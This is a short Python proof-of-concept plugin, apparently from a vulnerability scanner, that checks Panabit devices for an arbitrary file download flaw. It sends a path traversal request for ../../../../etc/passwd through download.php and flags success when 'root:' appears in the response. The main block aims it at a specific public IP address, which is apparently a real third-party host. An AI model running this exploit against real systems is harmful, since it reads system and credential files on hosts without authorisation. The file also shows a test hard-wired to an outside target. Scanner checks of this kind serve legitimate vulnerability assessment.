#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: panabit任意文件下载
refer: http://wooyun.org/bugs/wooyun-2010-0114137
refer: http://www.wooyun.org/bugs/wooyun-2010-0136721
description:
    任意文件遍历:http://foorbar/download.php?filename=../../../../etc/passwd
'''

import re
import urlparse


def assign(service, arg):
    if service == 'panabit':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    #任意文件遍历
    payload = arg + 'download.php?filename=../../../../etc/passwd'
    code, head, res, err, _ = curl.curl2(payload)
    if code == 200 and 'root:' in res:
        security_hole('Arbitrarilly file download: ' + payload)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('panabit','http://112.91.216.180/')[1])